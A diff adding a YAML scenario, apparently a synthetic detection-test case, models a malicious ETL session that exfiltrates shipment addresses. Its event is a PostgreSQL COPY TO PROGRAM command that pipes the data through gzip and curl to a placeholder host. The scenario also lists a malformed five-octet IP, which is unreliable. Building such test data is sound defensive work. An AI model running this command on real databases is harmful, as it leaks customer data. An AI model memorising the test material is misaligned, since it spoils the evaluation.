@@ -1,0 +1,30 @@
+scenario_id: gen_logistics_82_copy_to_program_mal_2336m
+family_id: gen_logistics_82_copy_to_program_fam_2336
+domain: logistics
+time_of_day: '23:35'
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: partner_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 5.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT dest_address FROM shipments) TO PROGRAM 'gzip | curl -sX POST
+      https://warehouse-sync.datasink.example/ingest --data-binary @-'
+    connects_to:
+      ip: 141.98.11.43.135
+      port: 9443
+matched_pair_id: gen_logistics_82_copy_to_program_pair_2336
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
